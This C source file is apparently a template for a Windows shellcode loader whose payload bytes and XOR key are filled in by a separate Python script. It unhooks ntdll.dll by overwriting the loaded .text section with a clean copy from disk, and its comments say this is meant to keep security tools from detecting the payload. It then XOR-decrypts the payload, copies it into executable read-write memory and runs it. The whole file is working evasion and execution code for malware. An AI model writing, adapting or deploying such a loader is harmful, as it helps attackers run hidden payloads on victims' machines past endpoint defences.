#include <windows.h>
#include <stdio.h>   // For printf (debug only)
#include <winternl.h> // For PE structures if not fully in windows.h

// Simple XOR decryption stub
void XOR(char *data, size_t data_len, char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key;
    }
}

// Shellcode and key are injected by the Python script
unsigned char shellcode[] = { {{ shellcode_hex }} };
char xor_key = {{ xor_key }}; // Renamed to avoid conflict with 'key' variable if any

// Function to unhook ntdll.dll by replacing its .text section
BOOL UnhookNtdll() {
    HANDLE hProcess = GetCurrentProcess();
    HMODULE hNtdllLoaded = NULL;
    PVOID pNtdllFreshBase = NULL;
    HANDLE hNtdllFile = INVALID_HANDLE_VALUE;
    HANDLE hNtdllFileMapping = NULL;
    BOOL bSuccess = FALSE;

    wchar_t ntdllPath[MAX_PATH];

    // Get handle to the loaded ntdll.dll
    hNtdllLoaded = GetModuleHandleW(L"ntdll.dll");
    if (hNtdllLoaded == NULL) {
        // printf("[-] Failed to get handle to loaded ntdll.dll. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Get the path to the system's ntdll.dll
    if (GetSystemDirectoryW(ntdllPath, MAX_PATH) == 0) {
        // printf("[-] Failed to get system directory. Error: %lu\n", GetLastError());
        return FALSE;
    }
    wcscat_s(ntdllPath, MAX_PATH, L"\\ntdll.dll");

    // Open the fresh ntdll.dll from disk
    hNtdllFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hNtdllFile == INVALID_HANDLE_VALUE) {
        // printf("[-] Failed to open fresh ntdll.dll from disk (%s). Error: %lu\n", ntdllPath, GetLastError());
        return FALSE;
    }

    // Create a file mapping for the fresh ntdll.dll
    // SEC_IMAGE_NO_EXECUTE is important as we are mapping it as a data file, not an executable image for direct loading.
    hNtdllFileMapping = CreateFileMappingW(hNtdllFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (hNtdllFileMapping == NULL) {
        // printf("[-] Failed to create file mapping for fresh ntdll.dll. Error: %lu\n", GetLastError());
        CloseHandle(hNtdllFile);
        return FALSE;
    }

    // Map a view of the fresh ntdll.dll into memory
    pNtdllFreshBase = MapViewOfFile(hNtdllFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (pNtdllFreshBase == NULL) {
        // printf("[-] Failed to map view of fresh ntdll.dll. Error: %lu\n", GetLastError());
        CloseHandle(hNtdllFileMapping);
        CloseHandle(hNtdllFile);
        return FALSE;
    }

    // PE Header Parsing for loaded (potentially hooked) ntdll.dll
    PIMAGE_DOS_HEADER pDosHeaderLoaded = (PIMAGE_DOS_HEADER)hNtdllLoaded;
    PIMAGE_NT_HEADERS pNtHeadersLoaded = (PIMAGE_NT_HEADERS)((PBYTE)hNtdllLoaded + pDosHeaderLoaded->e_lfanew);

    // PE Header Parsing for fresh ntdll.dll from disk
    PIMAGE_DOS_HEADER pDosHeaderFresh = (PIMAGE_DOS_HEADER)pNtdllFreshBase;
    PIMAGE_NT_HEADERS pNtHeadersFresh = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllFreshBase + pDosHeaderFresh->e_lfanew);

    // Find the .text section in both loaded and fresh ntdll
    PIMAGE_SECTION_HEADER pSectionHeaderLoaded = NULL;
    PIMAGE_SECTION_HEADER pSectionHeaderFresh = NULL;
    LPVOID pLoadedTextSectionTarget = NULL;
    LPVOID pFreshTextSectionSource = NULL;
    SIZE_T textSectionSize = 0;

    // Iterate over sections of loaded ntdll to find .text
    PIMAGE_SECTION_HEADER pCurrentSectionLoaded = IMAGE_FIRST_SECTION_HEADER(pNtHeadersLoaded);
    for (WORD i = 0; i < pNtHeadersLoaded->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pCurrentSectionLoaded[i].Name, ".text") == 0) {
            pSectionHeaderLoaded = &pCurrentSectionLoaded[i];
            pLoadedTextSectionTarget = (LPVOID)((PBYTE)hNtdllLoaded + pSectionHeaderLoaded->VirtualAddress);
            textSectionSize = pSectionHeaderLoaded->Misc.VirtualSize; // Use VirtualSize for in-memory size
            break;
        }
    }

    // Iterate over sections of fresh ntdll to find .text
    PIMAGE_SECTION_HEADER pCurrentSectionFresh = IMAGE_FIRST_SECTION_HEADER(pNtHeadersFresh);
    for (WORD i = 0; i < pNtHeadersFresh->FileHeader.NumberOfSections; i++) {
        // Ensure the section name comparison is safe
        if (strncmp((char*)pCurrentSectionFresh[i].Name, ".text", IMAGE_SIZEOF_SHORT_NAME) == 0) {
             pSectionHeaderFresh = &pCurrentSectionFresh[i];
             // The source address from fresh ntdll is its base in memory + RVA of .text
             pFreshTextSectionSource = (LPVOID)((PBYTE)pNtdllFreshBase + pSectionHeaderFresh->VirtualAddress);
             // Optional: verify textSectionSize matches or take min if different
             // For simplicity, assuming they are compatible enough.
             break;
        }
    }
    
    if (pLoadedTextSectionTarget && pFreshTextSectionSource && textSectionSize > 0) {
        DWORD dwOldProtect = 0;
        // Make the .text section of loaded ntdll writable
        if (VirtualProtect(pLoadedTextSectionTarget, textSectionSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
            // Copy the .text section from fresh ntdll over the loaded one
            memcpy(pLoadedTextSectionTarget, pFreshTextSectionSource, textSectionSize);
            
            // Restore original memory protection
            VirtualProtect(pLoadedTextSectionTarget, textSectionSize, dwOldProtect, &dwOldProtect); // Second dwOldProtect is dummy
            
            // Flush the instruction cache for the modified region
            FlushInstructionCache(GetCurrentProcess(), pLoadedTextSectionTarget, textSectionSize);
            
            // printf("[+] ntdll.dll .text section unhooked successfully.\n");
            bSuccess = TRUE;
        } else {
            // printf("[-] Failed to change memory protection of loaded ntdll .text section. Error: %lu\n", GetLastError());
        }
    } else {
        // printf("[-] Could not find .text section in loaded or fresh ntdll, or size is zero.\n");
    }

    // Cleanup
    UnmapViewOfFile(pNtdllFreshBase);
    CloseHandle(hNtdllFileMapping);
    CloseHandle(hNtdllFile);

    return bSuccess;
}

DWORD WINAPI ExecuteShellcode(LPVOID lpParameter) {
    // Decrypt the payload first
    XOR((char*)shellcode, sizeof(shellcode), xor_key);

    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        return 1;
    }

    // Using RtlMoveMemory or a simple loop for copying to avoid dependency on msvcrt.lib's memcpy if trying to be minimal
    // However, memcpy is fine for MinGW and typical C++ setups
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Create a function pointer and execute
    ((void(*)())exec_mem)();
    
    // Shellcode likely won't return, but if it did:
    // VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}


int main(void) {
    // Attempt to unhook ntdll.dll first
    // if (!UnhookNtdll()) {
        // Unhooking failed, could decide to exit or proceed with caution
        // printf("[-] API unhooking failed. Shellcode execution might be detected.\n");
    // } else {
        // printf("[+] API unhooking attempted.\n");
    // }
    UnhookNtdll(); // Call it regardless of success for this template


    // Execute the shellcode
    // For stealth, could execute in a new thread, but for simplicity, direct execution here
    ExecuteShellcode(NULL);

    return 0;
}

// Minimal entry point for smaller executable size (optional, main is fine)
// void WINAPI WinMainCRTStartup() {
//     if (UnhookNtdll()) {
//         // Proceed to execute shellcode
//     }
//     ExecuteShellcode(NULL);
//     ExitProcess(0);
// }